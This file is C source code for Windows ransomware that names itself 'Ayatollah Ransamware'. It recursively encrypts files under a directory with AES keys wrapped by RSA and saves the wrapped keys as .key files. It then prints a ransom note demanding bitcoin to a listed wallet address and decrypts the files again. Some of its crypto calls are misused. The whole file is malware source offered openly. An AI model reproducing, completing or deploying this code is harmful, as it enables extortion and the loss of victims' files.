#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void generate_rsa_key(HCRYPTPROV hProv, HCRYPTKEY *hKey) {
    if (!CryptGenKey(hProv, CALG_RSA_KEYX, CRYPT_EXPORTABLE, hKey)) {
        perror("Errore In make  RSA  Key");
        exit(1);
    }
}


void encrypt_aes_key(HCRYPTKEY hRsaKey, BYTE *aes_key, DWORD aes_key_size, BYTE *encrypted_key, DWORD *encrypted_key_size) {
    if (!CryptEncrypt(hRsaKey, 0, TRUE, 0, encrypted_key, encrypted_key_size, aes_key_size)) {
        perror("Errore In AES");
        exit(1);
    }
}


void encrypt_file(const char *filename, BYTE *aes_key) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        perror("Cant open file");
        return;
    }

    
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    BYTE *plaintext = malloc(file_size);
    fread(plaintext, 1, file_size, file);

    
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        perror("Errore In CryptAcquireContext");
        fclose(file);
        free(plaintext);
        return;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        perror("Errore CryptCreateHash");
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    if (!CryptHashData(hHash, aes_key, 32, 0)) {
        perror("Errore In CryptHashData");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        perror("Errore In CryptDeriveKey");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    DWORD encrypted_size = file_size;
    if (!CryptEncrypt(hKey, 0, TRUE, 0, plaintext, &encrypted_size, file_size)) {
        perror("Errore In CryptEncrypt");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(plaintext);
        return;
    }

    
    fseek(file, 0, SEEK_SET);
    fwrite(plaintext, 1, file_size, file);

    fclose(file);
    free(plaintext);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void encrypt_directory(const char *path, HCRYPTKEY hRsaKey) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", path);

    WIN32_FIND_DATA find_data;
    HANDLE hFind = FindFirstFile(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        perror("Unexcepted Errore");
        return;
    }

    do {
        
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        char filepath[MAX_PATH];
        snprintf(filepath, MAX_PATH, "%s\\%s", path, find_data.cFileName);

        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            encrypt_directory(filepath, hRsaKey);
        } else {
             
            printf("File encryption with: %s\n", filepath);

        
            BYTE aes_key[32];
            if (!CryptGenRandom(hRsaKey, 32, aes_key)) {
                perror("Error TO make AES key");
                continue;
            }

        
            encrypt_file(filepath, aes_key);
            BYTE encrypted_key[256];
            DWORD encrypted_key_size = sizeof(encrypted_key);
            encrypt_aes_key(hRsaKey, aes_key, 32, encrypted_key, &encrypted_key_size);

        
            char key_filename[MAX_PATH];
            snprintf(key_filename, MAX_PATH, "%s.key", filepath);
            FILE *key_file = fopen(key_filename, "wb");
            fwrite(encrypted_key, 1, encrypted_key_size, key_file);
            fclose(key_file);
        }
    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);
}

void decrypt_aes_key(HCRYPTKEY hRsaKey, BYTE *encrypted_key, DWORD encrypted_key_size, BYTE *aes_key, DWORD *aes_key_size) {
    if (!CryptDecrypt(hRsaKey, 0, TRUE, 0, encrypted_key, &encrypted_key_size)) {
        perror("AES Errore");
        exit(1);
    }
    *aes_key_size = encrypted_key_size;
}


void decrypt_file(const char *filename, BYTE *aes_key) {
    FILE *file = fopen(filename, "rb+");
    if (!file) {
        perror("cant open file!");
        return;
    }
    fseek(file, 0, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0, SEEK_SET);

    BYTE *ciphertext = malloc(file_size);
    fread(ciphertext, 1, file_size, file);

    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;
    // Decrypt flow errors
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        perror(" CryptAcquireContext");
        fclose(file);
        free(ciphertext);
        return;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) {
        perror("CryptCreateHash");
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(ciphertext);
        return;
    }

    if (!CryptHashData(hHash, aes_key, 32, 0)) {
        perror("CryptHashData");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(ciphertext);
        return;
    }

    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)) {
        perror("CryptDeriveKey");
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(ciphertext);
        return;
    }

    DWORD decrypted_size = file_size;
    if (!CryptDecrypt(hKey, 0, TRUE, 0, ciphertext, &decrypted_size)) {
        perror(" CryptDecrypt");
        CryptDestroyKey(hKey);
        CryptDestroyHash(hHash);
        CryptReleaseContext(hProv, 0);
        fclose(file);
        free(ciphertext);
        return;
    }
    
    fseek(file, 0, SEEK_SET);
    fwrite(ciphertext, 1, file_size, file);

    fclose(file);
    free(ciphertext);
    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
}

void decrypt_directory(const char *path, HCRYPTKEY hRsaKey) {
    char search_path[MAX_PATH];
    snprintf(search_path, MAX_PATH, "%s\\*", path);

    WIN32_FIND_DATA find_data;
    HANDLE hFind = FindFirstFile(search_path, &find_data);

    if (hFind == INVALID_HANDLE_VALUE) {
        perror("Unexepted Errore");
        return;
    }

    do {
       
        if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0) {
            continue;
        }

        char filepath[MAX_PATH];
        snprintf(filepath, MAX_PATH, "%s\\%s", path, find_data.cFileName);

        
        if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            decrypt_directory(filepath, hRsaKey);
        } else {
            
            printf(" %s\n", filepath);

            
            char key_filename[MAX_PATH];
            snprintf(key_filename, MAX_PATH, "%s.key", filepath);
            FILE *key_file = fopen(key_filename, "rb");
            if (!key_file) {
                perror("Key Lost");
                continue;
            }

            BYTE encrypted_key[256];
            DWORD encrypted_key_size = fread(encrypted_key, 1, sizeof(encrypted_key), key_file);
            fclose(key_file);     
            BYTE aes_key[32];
            DWORD aes_key_size = sizeof(aes_key);
            decrypt_aes_key(hRsaKey, encrypted_key, encrypted_key_size, aes_key, &aes_key_size);

            
            decrypt_file(filepath, aes_key);
        }
    } while (FindNextFile(hFind, &find_data) != 0);

    FindClose(hFind);
}

void display_ransom_message() {
    printf("\n\n========================================\n");
    printf("Every file Are encrypt!\n");
    printf("\n");
    printf("Dont trust people. send me 0.01BTC.\n");
    printf("1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n");
    printf("If You Lost Return To Jesus\n");
    printf("Dont try this at home\n");
    printf("========================================\n\n");
}

int main() {
    printf( "Ayatollah Ransamware Start\n");

    HCRYPTPROV hProv;
    HCRYPTKEY hRsaKey;
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        perror("Unxepted Eror In CryptAcquireContext");
        return 1;
    }
    generate_rsa_key(hProv, &hRsaKey);

    encrypt_directory("C:\\test", hRsaKey);     
    display_ransom_message();

    
    printf("start decreapting\n");
    decrypt_directory("C:\\test", hRsaKey);

    CryptDestroyKey(hRsaKey);
    CryptReleaseContext(hProv, 0);

    return 0;
}